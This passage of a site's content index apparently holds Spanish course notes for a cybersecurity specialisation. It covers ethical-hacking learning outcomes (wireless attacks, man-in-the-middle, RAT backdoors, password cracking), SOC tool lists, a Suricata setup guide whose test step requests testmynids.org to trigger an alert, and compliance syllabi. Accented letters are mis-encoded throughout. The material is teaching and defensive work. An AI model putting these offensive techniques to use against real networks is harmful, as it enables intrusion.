FreeNet.\n\nRA 2. Ataca y defiende en entornos de prueba, comunicaciones inal√°mbricas consiguiendo acceso a redes para demostrar sus vulnerabilidades.\nCriterios de evaluaci√≥n:\na) Se han configurado los distintos modos de funcionamiento de las tarjetas de red inal√°mbricas.\n\nContenido asociado: Comunicaci√≥n inal√°mbrica.\nContenido asociado: Modo infraestructura, ad-hoc y monitor.\n\nPr√°cticas:\n\nIntro a redes: tryhackme.com/r/room/whatisnetworking\n\nb) Se han descrito las t√©cnicas de encriptaci√≥n de las redes inal√°mbricas y sus puntos vulnerables.\nc) Se han detectado redes inal√°mbricas y se ha capturado tr√°fico de red como paso previo a su ataque.\n\nContenido asociado: An√°lisis y recolecci√≥n de datos en redes inal√°mbricas.\n\nPr√°cticas:\n\nWifi: tryhackme.com/r/room/wifihacking101\n\nd) Se ha accedido a redes inal√°mbricas vulnerables.\n\nContenido asociado: T√©cnicas de ataques y exploraci√≥n de redes inal√°mbricas.\n\ne) Se han caracterizado otros sistemas de comunicaci√≥n inal√°mbricos y sus vulnerabilidades.\n\nContenido asociado: Ataques a otros sistemas inal√°mbricos.\n\nf) Se han utilizado t√©cnicas de ‚ÄúEquipo Rojo y Azul‚Äù.\ng) Se han realizado informes sobre las vulnerabilidades detectadas.\n\nContenido asociado: Realizaci√≥n de informes de auditor√≠a y presentaci√≥n de resultados.\n\nRA 3. Ataca y defiende en entornos de prueba, redes y sistemas consiguiendo acceso a informaci√≥n y sistemas de terceros.\nCriterios de evaluaci√≥n:\na) Se ha recopilado informaci√≥n sobre la red y sistemas objetivo mediante t√©cnicas pasivas.\n\nContenido asociado: Fase de reconocimiento (footprinting).\n\nb) Se ha creado un inventario de equipos, cuentas de usuario y potenciales vulnerabilidades de la red y sistemas objetivo mediante t√©cnicas activas.\n\nContenido asociado: Fase de escaneo (fingerprinting).\n\nPr√°ctica:\n\ntryhackme.com/r/room/networkservices\n\nc) Se ha interceptado tr√°fico de red de terceros para buscar informaci√≥n sensible.\n\nContenido asociado: Monitorizacion de tr√°fico.\nContenido asociado: Interceptaci√≥n de comunicaciones utilizando distintas t√©cnicas.\n\nd) Se ha realizado un ataque de intermediario, leyendo, insertando y modificando, a voluntad, el tr√°fico intercambiado por dos extremos remotos.\n\nContenido asociado: Manipulaci√≥n e inyecci√≥n de tr√°fico.\n\ne) Se han comprometido sistemas remotos explotando sus vulnerabilidades.\n\nContenido asociado: Herramientas de b√∫squeda y explotaci√≥n de vulnerabilidades.\nContenido asociado: Ingenier√≠a social. Phising.\nContenido asociado: Escalada de privilegios.\n\nRA 4. Consolida y utiliza sistemas comprometidos garantizando accesos futuros.\nCriterios de evaluaci√≥n:\na) Se han administrado sistemas remotos a trav√©s de herramientas de l√≠nea de comandos.\n\nContenido asociado: Administraci√≥n de sistemas de manera remota.\n\nb) Se han comprometido contrase√±as a trav√©s de ataques de diccionario, tablas rainbow y fuerza bruta contra sus versiones encriptadas.\n\nContenido asociado: Ataques y auditor√≠as de contrase√±as.\n\nc) Se ha accedido a sistemas adicionales a trav√©s de sistemas comprometidos.\n\nContenido asociado: Pivotaje en la red.\n\nd) Se han instalado puertas traseras para garantizar accesos futuros a los sistemas comprometidos.\n\nContenido asociado: Instalaci√≥n de puertas traseras con troyanos (RAT, Remote Access Trojan).\n\nRA 5. Ataca y defiende en entornos de prueba, aplicaciones web consiguiendo acceso a datos o funcionalidades no autorizadas.\nCriterios de evaluaci√≥n:\na) Se han identificado los distintos sistemas de autenticaci√≥n web, destacando sus debilidades y fortalezas.\n\nContenido asociado: Negaci√≥n de credenciales en aplicaciones web.\n\nb) Se ha realizado un inventario de equipos, protocolos, servicios y sistemas operativos que proporcionan el servicio de una aplicaci√≥n web.\n\nContenido asociado: Recolecci√≥n de informaci√≥n.\n\nc) Se ha analizado el flujo de las interacciones realizadas entre el navegador y la aplicaci√≥n web durante su uso normal.\n\nContenido asociado: Automatizaci√≥n de conexiones a servidores web (ejemplo: Selenium).\n\nd) Se han examinado manualmente aplicaciones web en busca de las vulnerabilidades m√°s habituales.\n\nContenido asociado: An√°lisis de tr√°fico a trav√©s de proxies de intercepci√≥n.\n\ne) Se han usado herramientas de b√∫squedas y explotaci√≥n de vulnerabilidades web.\n\nContenido asociado: B√∫squeda de vulnerabilidades habituales en aplicaciones web.\n\nf) Se ha realizado la b√∫squeda y explotaci√≥n de vulnerabilidades web mediante herramientas software.\n\nContenido asociado: Herramientas para la explotaci√≥n de vulnerabilidades web.\n"},"Hacking-√©tico/webs-para-aprender-mas":{"title":"webs-para-aprender-mas","links":[],"tags":[],"content":"Webs para aprender m√°s\ninventory.raw.pm/overview.html"},"Incidentes-de-ciberseguridad/RA-2/Herramientas-de-un-SOC":{"title":"Herramientas de un SOC","links":[],"tags":[],"content":"Herramientas de un SOC\nSIEM\nEl siem es una herramienta de monitorizaci√≥n.\n\nELK\nSplunk\nQRadar\n\nEDR\n\nWazuh\nMicrosoft SentinelOne\n\nNetworkd IDS/IPS\n\nSnort\nSuricata\n\nHost IDS/IPS\n\nOSSEC\nFleet + OSQuery\n\nBehavioral Network Analyzer\n\nZeek (antiguo Bro)\n\nDFIR\n\nVelociraptor\n\nSIRP\n\nTheHive\nDFIR-Iris\nDFIRTrack\nFast Incident Response (FIR)\nJIRA (gen√©rica)\n\nSOAR\n\nCatalyst\n\nFirewall\n\nHardware\nSoftware\n\nIPTables\nNFTables\n\n\n\nThreat Intelligence\n\nVirusTotal\nURLScan\nPalo alto network scanner\nAnyRun\nAbuseIPDB\nCisco Talos\n\nIOC\n\nMISP\nCortex\n\nHoneypots\nFrameworks\n\nNIST\nIncibe\nEsquema nacional de seguridad\n\nThreat hunting\n\nMitre ATT&amp;CK\n\nSO especializados\n\nSecurity Onion\nQubeOS\nTails\nWhonix\nFedora Silverblue\n\n"},"Incidentes-de-ciberseguridad/deteccion/README":{"title":"README","links":[],"tags":[],"content":"Detecci√≥n"},"Incidentes-de-ciberseguridad/deteccion/suricata":{"title":"suricata","links":[],"tags":[],"content":"Suricata\nInstalaci√≥n de software previo\napt update\napt install software-properties-common iproute-2 nano curl -y\napt install suricata -y\n\nVer la interfaz de red a usar y anotarla:\nip a\nnano /etc/suricata/suricata.yaml\n\nDentro del archivo, cambiar las siguientes 4 cosas:\n...\n\n  community-id: true\n  \n...\n\naf-packet:\n  - interface: &lt;la-anotada-tras-ip-a&gt;\n  \n... \n\ndefault-rule-path: /var/lib/suricata/rules\n\nrule-files:\n  - suricata.rules\n  \n...\n\n# Al final del archivo, incluir:\ndetect-engine:\n  -  rule-reload: true\n\nTras esto, guardar el archivo y ejecutar los siguientes comandos:\nsuricata-update\nsuricata-update list-sources\nsuricata-update enable-source et/open\nsuricata -T -c /etc/suricata/suricata.yaml -v\n\nSi nos da ok, todo est√° bien, habilitamos suricata cambiando el siguiente archivo:\nnano /etc/default/suricata\n\nDentro del archivo modificar ‚ÄúRUN=yes‚Äù\nFinalmente reiniciamos suricata:\npidof suricata\nkill &lt;pid-anterior&gt;\nsystemctl restart suricata\nsystemctl enable suricata\n\nProbamos suricata\ncurl testmynids.org/uid/index.html\ngrep 2100498 /var/log/suricata/fast.log\njq &#039;select(.alert .signature_id==2100498)&#039; /var/log/suricata/eve.json\n"},"Incidentes-de-ciberseguridad/index":{"title":"Incidentes de ciberseguridad","links":["Incidentes-de-ciberseguridad/respuesta-a-incidentes","Incidentes-de-ciberseguridad/deteccion/README","Incidentes-de-ciberseguridad/deteccion/suricata","Incidentes-de-ciberseguridad/ra-criterios-contenidos-practicas","Normativa-de-ciberseguridad/ra-criterios-contenidos-practicas","Seguridad-inform√°tica/ra-criterios-contenidos-practicas"],"tags":[],"content":"Incidentes de ciberseguridad es un m√≥dulo del curso de especializaci√≥n en ciberseguridad en entornos de las tecnolog√≠as de la informaci√≥n (CETI). En esta documentaci√≥n pretendo realizar un an√°lisis y resumen de los contenidos que se pueden impartir en este curso. El objetivo no es realizar una gu√≠a detallada  \n\nRespuesta a incidentes\nDetecci√≥n\n\nSuricata\n\n\nIC - RA - Criterios - Contenidos - Pr√°cticas\nNC - RA - Criterios - Contenidos - Pr√°cticas\nSEGIN - RA - Criterios - Contenidos - Pr√°cticas\n"},"Incidentes-de-ciberseguridad/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"RA - Criterios - Contenidos - Pr√°cticas\nRA1. Desarrolla planes de prevenci√≥n y concienciaci√≥n en ciberseguridad, estableciendo normas y medidas de protecci√≥n.\nCriterios de evaluaci√≥n:\na) Se han definido los principios generales de la organizaci√≥n en materia de ciberseguridad, que deben ser conocidos y apoyados por la direcci√≥n de la misma.\n\nContenido asociado: Principios generales en materia de ciberseguridad.\n\nPr√°cticas:\n\ntryhackme.com/r/room/careersincyber\ntryhackme.com/r/room/securityprinciples\n\nb) Se ha establecido una normativa de protecci√≥n del puesto de trabajo.\n\nContenido asociado: Normativa de protecci√≥n del puesto del trabajo.\n\nc) Se ha definido un plan de concienciaci√≥n de ciberseguridad dirigido a los empleados.\n\nContenido asociado: Plan de formaci√≥n y concienciaci√≥n en materia de ciberseguridad.\n\nd) Se ha desarrollado el material necesario para llevar a cabo las acciones de concienciaci√≥n dirigidas a los empleados.\n\nContenido asociado: Materiales de formaci√≥n y concienciaci√≥n.\n\nMateriales para trabajar esto:\nwww.incibe.es/empresas/formacion/kit-concienciacion\ne) Se ha realizado una auditor√≠a para verificar el cumplimiento del plan de prevenci√≥n y concienciaci√≥n de la organizaci√≥n.\n\nContenido asociado: Auditor√≠as internas de cumplimiento en materia de prevenci√≥n.\n\n2. Analiza incidentes de ciberseguridad utilizando herramientas, mecanismos de detecci√≥n y alertas de seguridad.\nCriterios de evaluaci√≥n:\na) Se ha clasificado y definido la taxonom√≠a de incidentes de ciberseguridad que pueden afectar a la organizaci√≥n.\n\nContenido asociado: Taxonom√≠a de incidentes de ciberseguridad.\n\nMateriales:\ngithub.com/enisaeu/Reference-Security-Incident-Taxonomy-Task-Force/blob/034cea9442ca2f704d06311bc76a6637bef8e6cb/working_copy/humanv1.md\nwww.incibe.es/sites/default/files/contenidos/guias/doc/guia_nacional_notificacion_gestion_ciberincidentes.pdf\nwww.ccn-cert.cni.es/es/series-ccn-stic/800-guia-esquema-nacional-de-seguridad/988-ccn-stic-817-gestion-de-ciberincidentes/file\nb) Se han establecido controles, herramientas y mecanismos de monitorizaci√≥n, identificaci√≥n, detecci√≥n y alerta de incidentes\n\nContenido asociado: Controles, herramientas y mecanismos de monitorizaci√≥n, identificaci√≥n, detecci√≥n y alerta de incidentes: tipos y fuentes\n\nc) Se han establecido controles y mecanismos de detecci√≥n e identificaci√≥n de incidentes de seguridad f√≠sica.\n\nContenido asociado: Controles, herramientas y mecanismos de detecci√≥n e identificaci√≥n de incidentes de seguridad f√≠sica.\n\nd) Se han establecido controles, herramientas y mecanismos de monitorizaci√≥n, identificaci√≥n, detecci√≥n y alerta de incidentes a trav√©s de la investigaci√≥n en fuentes abiertas (OSINT: Open Source Intelligence).\n\nContenido asociado: Controles, herramientas y mecanismos de monitorizaci√≥n, identificaci√≥n, detecci√≥n y alerta de incidentes a trav√©s de la investigaci√≥n en fuentes abiertas (OSINT).\n\ne) Se ha realizado una clasificaci√≥n, valoraci√≥n, documentaci√≥n y seguimiento de los incidentes detectados dentro de la organizaci√≥n.\n\nContenido asociado: Clasificaci√≥n, valoraci√≥n, documentaci√≥n, seguimiento inicial de incidentes de ciberseguridad.\n\n3. Investiga incidentes de ciberseguridad analizando los riesgos implicados y definiendo las posibles medidas a adoptar.\nCriterios de evaluaci√≥n:\na) Se han recopilado y almacenado de forma segura evidencias de incidentes de ciberseguridad que afectan a la organizaci√≥n.\n\nContenido asociado: Recopilaci√≥n de evidencias.\n\nb) Se ha realizado un an√°lisis de evidencias.\n\nContenido asociado: An√°lisis de evidencias.\n\nc) Se ha realizado la investigaci√≥n de incidentes de ciberseguridad.\n\nContenido asociado: Investigaci√≥n del incidente\n\nd) Se ha intercambiado informaci√≥n de incidentes, con proveedores y/o organismos competentes que podr√≠an hacer aportaciones al respecto.\n\nContenido asociado: Intercambio de informaci√≥n del incidente con proveedores u organismos competentes.\n\ne) Se han iniciado las primeras medidas de contenci√≥n de los incidentes para limitar los posibles da√±os causados.\n\nContenido asociado: Medidas de contenci√≥n de incidentes.\n\n4. Implementa medidas de ciberseguridad en redes y sistemas respondiendo a los incidentes detectados y aplicando las t√©cnicas de protecci√≥n adecuadas.\nCriterios de evaluaci√≥n:\na) Se han desarrollado procedimientos de actuaci√≥n detallados para dar respuesta, mitigar, eliminar o contener los tipos de incidentes de ciberseguridad m√°s habituales.\n\nContenido asociado: Desarrollar procedimientos de actuaci√≥n detallados para dar respuesta, mitigar, eliminar o contener los tipos de incidentes.\n\nb) Se han preparado respuestas ciberresilientes ante incidentes que permitan seguir prestando los servicios de la organizaci√≥n y fortaleciendo las capacidades de identificaci√≥n, detecci√≥n, prevenci√≥n, contenci√≥n, recuperaci√≥n y cooperaci√≥n con terceros.\n\nContenido asociado: Implantar capacidades de ciberresiliencia.\n\nc) Se ha establecido un flujo de toma de decisiones y escalado de incidentes interno y/o externo adecuados.\n\nContenido asociado: Establecer flujos de toma de decisiones y escalado interno y/o externo adecuados.\n\nd) Se han llevado a cabo las tareas de restablecimiento de los servicios afectados por un incidente hasta confirmar la vuelta a la normalidad.\n\nContenido asociado: Tareas para reestablecer los servicios afectados por incidentes.\n\ne) Se han documentado las acciones realizadas y las conclusiones que permitan mantener un registro de ‚Äúlecciones aprendidas‚Äù.\n\nContenido asociado: Documentaci√≥n\n\nf) Se ha realizado un seguimiento adecuado del incidente para evitar que una situaci√≥n similar se vuelva a repetir.\n\nContenido asociado: Seguimiento de incidentes para evitar una situaci√≥n similar.\n\n5. Detecta y documenta incidentes de ciberseguridad siguiendo procedimientos de actuaci√≥n establecidos.\nCriterios de evaluaci√≥n:\na) Se ha desarrollado un procedimiento de actuaci√≥n detallado para la notificaci√≥n de incidentes de ciberseguridad en los tiempos adecuados.\n\nContenido asociado: Desarrollar procedimientos de actuaci√≥n para la notificaci√≥n de incidentes.\n\nwww.incibe.es/sites/default/files/contenidos/guias/doc/guia_nacional_notificacion_gestion_ciberincidentes.pdf\nwww.ccn-cert.cni.es/es/series-ccn-stic/800-guia-esquema-nacional-de-seguridad/988-ccn-stic-817-gestion-de-ciberincidentes/file\nb) Se ha notificado el incidente de manera adecuada al personal interno de la organizaci√≥n responsable de la toma de decisiones.\n\nContenido asociado: Notificaci√≥n interna de incidentes.\n\nc) Se ha notificado el incidente de manera adecuada a las autoridades competentes en el √°mbito de la gesti√≥n de incidentes de ciberseguridad en caso de ser necesario.\n\nContenido asociado: Notificaci√≥n de incidentes a quienes corresponda.\n\nd) Se ha notificado formalmente el incidente a los afectados, personal interno, clientes, proveedores, etc., en caso de ser necesario.\ne) Se ha notificado el incidente a los medios de comunicaci√≥n en caso de ser necesario."},"Incidentes-de-ciberseguridad/respuesta-a-incidentes":{"title":"respuesta-a-incidentes","links":[],"tags":[],"content":"Respuesta a incidentes\nIntro: tryhackme.com/room/introtoirandim"},"Normativa-de-ciberseguridad/index":{"title":"Normativa de ciberseguridad","links":[],"tags":[],"content":"En primer lugar vamos a analizar los resultados de aprendizaje, criterios de evaluaci√≥n, contenidos y posibles enlaces a las pr√°cticas a realizar:"},"Normativa-de-ciberseguridad/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"RA - Criterios - Contenidos - Pr√°cticas\n1. Identifica los puntos principales de aplicaci√≥n para asegurar el cumplimiento normativo reconociendo funciones y responsabilidades.\nCriterios de evaluaci√≥n:\na) Se han identificado las bases del cumplimiento normativo a tener en cuenta en las organizaciones.\n\nContenido asociado: Introducci√≥n al cumplimiento normativo (Compliance: objetivo, definici√≥n y conceptos principales).\n\nb) Se han descrito y aplicado los principios de un buen gobierno y su relaci√≥n con la √©tica profesional.\n\nContenido asociado: Principios del buen gobierno y √©tica empresarial.\n\nPr√°cticas:\n\ntryhackme.com/r/room/cybergovernanceregulation\n\nc) Se han definido las pol√≠ticas y procedimientos, as√≠ como la estructura organizativa que establezca la cultura del cumplimiento normativo dentro de las organizaciones.\nd) Se han descrito las funciones o competencias del responsable del cumplimiento normativo dentro de las organizaciones.\n\nContenido asociado: Compliance Officer: funciones y responsabilidades.\n\ne) Se han establecido las relaciones con terceros para un correcto cumplimiento normativo.\n\nContenido asociado: Relaciones con terceras partes dentro del Compliance.\n\n2. Dise√±a sistemas de cumplimiento normativo seleccionando la legislaci√≥n y jurisprudencia de aplicaci√≥n.\nCriterios de evaluaci√≥n:\na) Se han recogido las principales normativas que afectan a los diferentes tipos de organizaciones.\n\nContenido asociado: Sistemas de Gesti√≥n de Compliance.\n\nb) Se han establecido las recomendaciones v√°lidas para diferentes tipos de organizaciones de acuerdo con la normativa vigente (ISO 19.600 entre otras).\n\nContenido asociado: Entorno regulatorio de aplicaci√≥n.\n\nc) Se han realizado an√°lisis y evaluaciones de los riesgos de diferentes tipos de organizaciones de acuerdo con la normativa vigente (ISO 31.000 entre otras).\n\nContenido asociado: An√°lisis y gesti√≥n de riesgos, mapas de riesgos.\n\nd) Se ha documentado el sistema de cumplimiento normativo dise√±ado.\n\nContenido asociado: Documentaci√≥n del sistema de cumplimiento normativo dise√±ado.\n\n3. Relaciona la normativa relevante para el cumplimiento de la responsabilidad penal de las organizaciones y personas jur√≠dicas con los procedimientos establecidos, recopilando y aplicando las normas vigentes.\nCriterios de evaluaci√≥n:\na) Se han identificado los riesgos penales aplicables a diferentes organizaciones.\n\nContenido asociado: Riesgos penales que afectan a la organizaci√≥n.\n\nb) Se han implantado las medidas necesarias para eliminar o minimizar los riesgos identificados.\nc) Se ha establecido un sistema de gesti√≥n de cumplimiento normativo penal de acuerdo con la legislaci√≥n y normativa vigente (C√≥digo Penal y UNE 19.601, entre otros).\n\nContenido asociado: Sistemas de gesti√≥n de Compliance penal.\n\nd) Se han determinado los principios b√°sicos dentro de las organizaciones para combatir el soborno y promover una cultura empresarial √©tica de acuerdo con la legislaci√≥n y normativa vigente (ISO 37.001 entre otros).\n\nContenido asociado: Sistemas de gesti√≥n anticorrupci√≥n.\n\n4. Aplica la legislaci√≥n nacional de protecci√≥n de datos de car√°cter personal, relacionando los procedimientos establecidos con las leyes vigentes y con la jurisprudencia existente sobre la materia.\nCriterios de evaluaci√≥n:\na) Se han reconocido las fuentes del Derecho de acuerdo con el ordenamiento jur√≠dico en materia de protecci√≥n de datos de car√°cter personal.\n\nContenido asociado: Principios de protecci√≥n de datos.\n\nb) Se han aplicado los principios relacionados con la protecci√≥n de datos de car√°cter personal tanto a nivel nacional como internacional.\n\nContenido asociado: Novedades del RGPD de la Uni√≥n Europea.\n\nc) Se han establecido los requisitos necesarios para afrontar la privacidad desde las bases del dise√±o.\n\nContenido asociado: Privacidad por Dise√±o y por Defecto.\n\nd) Se han configurado las herramientas corporativas contemplando el cumplimiento normativo por defecto.\ne) Se ha realizado un an√°lisis de riesgos para el tratamiento de los derechos a la protecci√≥n de datos.\nf) Se han implantado las medidas necesarias para eliminar o minimizar los riesgos identificados en la protecci√≥n de datos.\n\nContenido asociado: An√°lisis de Impacto en Privacidad (PIA), y medidas de seguridad.\n\ng) Se han descrito las funciones o competencias del delegado de protecci√≥n de datos dentro de las organizaciones.\n\nContenido asociado: Delegado de Protecci√≥n de Datos (DPO).\n\n5. Recopila y aplica la normativa vigente de ciberseguridad de √°mbito nacional e internacional, actualizando los procedimientos establecidos de acuerdo con las leyes y con la jurisprudencia existente sobre la materia.\nCriterios de evaluaci√≥n:\na) Se ha establecido el plan de revisiones de la normativa, jurisprudencia, notificaciones, etc. jur√≠dicas que puedan afectar a la organizaci√≥n.\n\nContenido asociado: Normas nacionales e internacionales.\nContenido asociado: Sistema de Gesti√≥n de Seguridad de la Informaci√≥n (est√°ndares internacionales) (ISO 27.001).\nContenido asociado: Acceso electr√≥nico de los ciudadanos a los Servicios P√∫blicos.\n\nb) Se ha detectado nueva normativa consultando las bases de datos jur√≠dicas siguiendo el plan de revisiones establecido.\nc) Se ha analizado la nueva normativa para determinar si aplica a la actividad de la organizaci√≥n.\n\nContenido asociado: Esquema Nacional de Seguridad (ENS)\nContenido asociado: Planes de Continuidad de Negocio (est√°ndares internacionales) (ISO 22.301).\nContenido asociado: Directiva NIS.\nContenido asociado: Legislaci√≥n sobre la protecci√≥n de infraestructuras cr√≠ticas.\n\nd) Se ha incluido en el plan de revisiones las modificaciones necesarias, sobre la nueva normativa aplicable a la organizaci√≥n, para un correcto cumplimiento normativo.\n\nContenido asociado: Ley PIC (Protecci√≥n de infraestructuras cr√≠ticas).\n\ne) Se han determinado e implementado los controles necesarios para garantizar el correcto cumplimiento normativo de las nuevas normativas. incluidas en el plan de revisiones."},"Puesta-en-produccion-segura/index":{"title":"index","links":[],"tags":[],"content":"Texto"},"Puesta-en-produccion-segura/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"Introducci√≥n a python: tryhackme.com/r/room/pythonbasics"},"Redes-locales/index":{"title":"Redes locales","links":[],"tags":[],"content":"En primer lugar vamos a analizar los resultados de aprendizaje, criterios de evaluaci√≥n, contenidos y posibles enlaces a las pr√°cticas a realizar:"},"Redes-locales/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"Introducci√≥n a Linux: tryhackme.com/r/room/linuxfundamentalspart1\nIntro a redes: tryhackme.com/r/room/whatisnetworking"},"Seguridad-inform√°tica/index":{"title":"Seguridad inform√°tica","links":[],"tags":[],"content":"En primer lugar vamos a analizar los resultados de aprendizaje, criterios de evaluaci√≥n, contenidos y posibles enlaces a las pr√°cticas a realizar:"},"Seguridad-inform√°tica/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"RA - Criterios - Contenidos - Pr√°cticas\nRA 1. Aplica medidas de seguridad pasiva en sistemas inform√°ticos describiendo caracter√≠sticas de entornos y relacion√°ndolas con sus necesidades.\nCriterios de evaluaci√≥n:\na) Se ha valorado la importancia de mantener la informaci√≥n segura.\n\nContenido asociado: C 1.1 - Seguridad inform√°tica. Clasificaci√≥n, t√©cnicas y pr√°cticas de tratamiento seguro de la informaci√≥n.\n\nPr√°cticas:\n\ntryhackme.com/r/room/careersincyber\ntryhackme.com/r/room/securityprinciples\n\nb) Se han descrito las diferencias entre seguridad f√≠sica y l√≥gica.\nc) Se han definido las caracter√≠sticas de la ubicaci√≥n f√≠sica y condiciones ambientales de los equipos y servidores.\n\nContenido asociado: C 1.2 - Ubicaci√≥n y protecci√≥n f√≠sica de los equipos y servidores.\n\nd) Se ha identificado la necesidad de proteger f√≠sicamente los sistemas inform√°ticos.\ne) Se ha verificado el funcionamiento de los sistemas de alimentaci√≥n ininterrumpida.\n\nContenido asociado: C 1.3 - Sistemas de alimentaci√≥n ininterrumpida.\n\nf) Se han seleccionado los puntos de aplicaci√≥n de los sistemas de alimentaci√≥n ininterrumpida.\ng) Se han esquematizado las caracter√≠sticas de una pol√≠tica de seguridad basada en listas de control de acceso.\nh) Se ha valorado la importancia de establecer una pol√≠tica de contrase√±as.\ni) Se han valorado las ventajas que supone la utilizaci√≥n de sistemas biom√©tricos.\nRA 2. Gestiona dispositivos de almacenamiento describiendo los procedimientos efectuados y aplicando t√©cnicas para asegurar la integridad de la informaci√≥n.\nCriterios de evaluaci√≥n\na) Se ha interpretado la documentaci√≥n t√©cnica relativa a la pol√≠tica de almacenamiento.\n\nContenido asociado: C 2.7 - Pol√≠tica de almacenamiento.\n\nb) Se han tenido en cuenta factores inherentes al almacenamiento de la informaci√≥n (rendimiento, disponibilidad, accesibilidad, entre otros).\n\nContenido asociado: C 2.1 - Almacenamiento de la informaci√≥n: rendimiento, disponibilidad, accesibilidad.\nContenido asociado: C 2.4 - Criptograf√≠a.\n\nc) Se han clasificado y enumerado los principales m√©todos de almacenamiento incluidos los sistemas de almacenamiento en red.\nd) Se han descrito las tecnolog√≠as de almacenamiento redundante y distribuido.\n\nContenido asociado: C 2.2 - Almacenamiento redundante y distribuido.\n\ne) Se han seleccionado estrategias para la realizaci√≥n de copias de seguridad.\n\nContenido asociado: C 2.5 - Copias de seguridad e im√°genes de respaldo.\n\nf) Se ha tenido en cuenta la frecuencia y el esquema de rotaci√≥n.\ng) Se han realizado copias de seguridad con distintas estrategias.\nh) Se han identificado las caracter√≠sticas de los medios de almacenamiento remotos y extra√≠bles.\n\nContenido asociado: C 2.6 - Medios de almacenamiento.\n\ni) Se han utilizado medios de almacenamiento remotos y extra√≠bles.\n\nContenido asociado: C 2.3 - Almacenamiento remoto y extra√≠ble.\n\nj) Se han creado y restaurado im√°genes de respaldo de sistemas en funcionamiento.\n\nContenido asociado: C 2.8 - Recuperaci√≥n de datos\n\nRA 3. Aplica mecanismos de seguridad activa describiendo sus caracter√≠sticas y relacion√°ndolas con las necesidades de uso del sistema inform√°tico.\nCriterios de evaluaci√≥n\na) Se han seguido planes de contingencia para actuar ante fallos de seguridad.\n\nContenido asociado: C 3.5 - Utilizaci√≥n de cortafuegos en un sistema o servidor.\nContenido asociado: C 3.4 - Seguridad en los protocolos para comunicaciones inal√°mbricas.\nContenido asociado: C 3.6 - Listas de control de acceso.\nContenido asociado: C 3.7 - Pol√≠tica de contrase√±as.\n\nb) Se han clasificado los principales tipos de software malicioso.\n\nContenido asociado: C 3.9 - Software malicioso. Clasificaci√≥n, protecci√≥n y desinfecci√≥n.\n\nPr√°cticas\n\nAtaques comunes: tryhackme.com/r/room/commonattacks\n\nc) Se han realizado actualizaciones peri√≥dicas de los sistemas para corregir posibles vulnerabilidades.\n\nContenido asociado: C 3.10 - Auditorias de seguridad.\nContenido asociado: C 3.11 - Actualizaci√≥n de sistemas y aplicaciones.\n\nd) Se ha verificado el origen y la autenticidad de las aplicaciones que se instalan en los sistemas.\n\nContenido asociado: C 3.1 - Identificaci√≥n digital.\nContenido asociado: C 3.2 - Sistemas biom√©tricos de identificaci√≥n.\nContenido asociado: C 3.3 - Firma electr√≥nica y certificado digital.\n\ne) Se han instalado, probado y actualizado aplicaciones espec√≠ficas para la detecci√≥n y eliminaci√≥n de software malicioso.\n\nContenido asociado: C 3.5 - Utilizaci√≥n de cortafuegos en un sistema o servidor.\n\nf) Se han aplicado t√©cnicas de recuperaci√≥n de datos.\n\nContenido asociado: C 3.8 - Recuperaci√≥n de datos.\n\nRA 4. Asegura la privacidad de la informaci√≥n transmitida en redes inform√°ticas describiendo vulnerabilidades e instalando software espec√≠fico.\nCriterios de evaluaci√≥n\na) Se ha identificado la necesidad de inventariar y controlar los servicios de red.\nb) Se ha contrastado la incidencia de las t√©cnicas de ingenier√≠a social en los fraudes inform√°ticos y robos de informaci√≥n.\n\nContenido asociado: C 4.2 - Fraudes inform√°ticos y robos de informaci√≥n.\n\nc) Se ha deducido la importancia de minimizar el volumen de tr√°fico generado por la publicidad y el correo no deseado.\n\nContenido asociado: C 4.7 - Publicidad y correo no deseado.\n\nd) Se han aplicado medidas para evitar la monitorizaci√≥n de redes cableadas.\n\nCotenido asociado: C 4.3 - Control de la monitorizaci√≥n en redes cableadas.\n\ne) Se han clasificado y valorado las propiedades de seguridad de los protocolos usados en redes inal√°mbricas.\n\nContenido asociado: C 4.4 - Seguridad en redes inal√°mbricas.\n\nPr√°cticas:\n\nWifi: tryhackme.com/r/room/wifihacking101\n\nf) Se han descrito sistemas de identificaci√≥n como la firma electr√≥nica, certificado digital, entre otros.\n\nContenido asociado: C 4.1 - M√©todos para asegurar la privacidad de la informaci√≥n transmitida.\n\ng) Se han utilizado sistemas de identificaci√≥n como la firma electr√≥nica, certificado digital, entre otros.\n\nContenido asociado: C 4.5 - Sistemas de identificaci√≥n: firma electr√≥nica, certificados digitales y otros.\n\nh) Se ha instalado y configurado un cortafuegos en un equipo o servidor.\n\nContenido asociado: C 4.6 - Cortafuegos en equipos y servidores.\n\nRA 5. Reconoce la legislaci√≥n y normativa sobre seguridad y protecci√≥n de datos analizando las repercusiones de su incumplimiento.\nCriterios de evaluaci√≥n\na) Se ha descrito la legislaci√≥n sobre protecci√≥n de datos de car√°cter personal.\n\nContenido asociado: C 5.1 - Legislaci√≥n sobre protecci√≥n de datos.\n\nb) Se ha determinado la necesidad de controlar el acceso a la informaci√≥n personal almacenada.\nc) Se han identificado las figuras legales que intervienen en el tratamiento y mantenimiento de los ficheros de datos.\nd) Se ha contrastado la obligaci√≥n de poner a disposici√≥n de las personas los datos personales que les conciernen.\ne) Se ha descrito la legislaci√≥n actual sobre los servicios de la sociedad de la informaci√≥n y comercio electr√≥nico.\n\nContenido asociado: C 5.2 - Legislaci√≥n sobre los servicios de la sociedad de la informaci√≥n y correo electr√≥nico.\n\nf) Se han contrastado las normas sobre gesti√≥n de seguridad de la informaci√≥n.\nPr√°cticas:\n\ntryhackme.com/r/room/cybergovernanceregulation\n"},"Servicios-en-red/index":{"title":"Servicios en red","links":[],"tags":[],"content":"En primer lugar vamos a analizar los resultados de aprendizaje, criterios de evaluaci√≥n, contenidos y posibles enlaces a las pr√°cticas a realizar:"},"Servicios-en-red/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"Introducci√≥n a Linux: tryhackme.com/r/room/linuxfundamentalspart1\nIntro a redes: tryhackme.com/r/room/whatisnetworking\nContinuamos con redes: tryhackme.com/r/room/networkservices"},"index":{"title":"Rafael del R√≠o - Mi web de 